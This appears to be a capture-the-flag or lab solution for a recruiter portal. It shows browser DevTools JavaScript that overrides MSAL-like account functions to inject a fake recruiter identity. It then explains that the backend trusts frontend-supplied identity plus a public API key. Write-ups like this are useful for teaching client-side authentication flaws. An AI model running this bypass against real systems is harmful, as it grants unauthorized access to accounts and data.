# Solution

Open the recruiter page and override the MSAL-like account functions in DevTools:

```js
msal.instance.getAllAccounts = () => [
  { name: "Recruiter One", username: "recruiter@corp.local" }
];
msal.instance.getActiveAccount = function () {
  return this.getAllAccounts()[0];
};
authState.activeAccount = null;
authState.isAuthenticated = false;
bootRecruiterPortal();
```

The frontend accepts the fake account, and the backend starts a session using frontend-provided identity data plus a public API key instead of validating a real token.
